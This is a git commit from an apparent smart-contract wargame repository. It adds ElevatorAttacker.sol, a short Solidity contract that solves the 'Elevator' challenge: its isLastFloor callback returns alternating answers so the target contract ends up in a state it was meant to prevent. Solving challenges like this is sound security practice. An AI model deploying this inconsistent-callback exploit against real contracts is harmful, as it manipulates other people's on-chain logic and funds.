52569e653d6ce7c985a305ef03372ed3b79a717d
nukanoto <nukanoto@users.noreply.github.com>
2022-07-24 08:08:33 +0900

    add Elevator

---
+++ src/ElevatorAttacker.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+import './Elevator.sol';
+
+contract ElevatorAttacker {
+  bool a = true;
+
+  constructor() {}
+
+  function attack(address targetAddress) external {
+    Elevator target = Elevator(targetAddress);
+    target.goTo(1);
+  }
+
+  function isLastFloor(uint floor) external returns (bool) {
+    a = !a;
+    return a;
+  }
+}
